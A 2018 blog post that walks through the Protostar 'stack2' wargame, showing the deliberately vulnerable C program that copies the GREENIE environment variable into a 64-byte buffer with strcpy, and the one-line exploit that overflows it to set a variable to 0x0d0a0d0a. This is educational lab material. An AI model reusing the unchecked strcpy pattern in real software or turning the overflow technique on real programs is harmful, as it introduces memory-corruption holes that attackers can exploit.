---
layout: post
title: "Environment Variable Overflows: protostar stack2"
date: 2018-10-21 14:53:24 -700
categories: jekyll update
---

BRIEF UPDATE: For reasons I am not aware of, the original site that hosted protostar, is currently down.

Fortunately, there is another site, liveoverflow.com, which is hosts protostar source code, though the VM is not hosted there unfortunately. 

~

This next challenge in protostar involves setting environment variables.
{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
{% endhighlight %}

The code is not too different from what we have seen before, except that it uses a function called getenv().

getenv() returns a pointer to an environment variable, in this case, "GREENIE".

An environment variable is essentially a value stored in a specific 'environment'. They can be used by programs, like the one above.


Our goal is to set the 'modified' variable to be equal to 0x0d0a0d0a. Notice that this program doesn't take input from the command line OR with gets(), or even scanf().

If you haven't guessed, we need to set the environment variable GREENIE to let us overflow the buffer, and let us overwrite the 'modified'.


$export GREENIE="test"


$./stack2

Try again, you got 0x00000000 

$



That did change the control flow from the default error that would be displayed if variable was NULL. Now we just need to overflow!

$export GREENIE="$(python -c 'print "A"*64 + "\x0a\x0d\x0a\x0d"')"


$./stack2

you have correctly modified the variable

$

Cool. 
Notice that unlike the gets() or strcpy() overflows, for this one, we need to only fill the buffer with 64 "A"s instead of 72.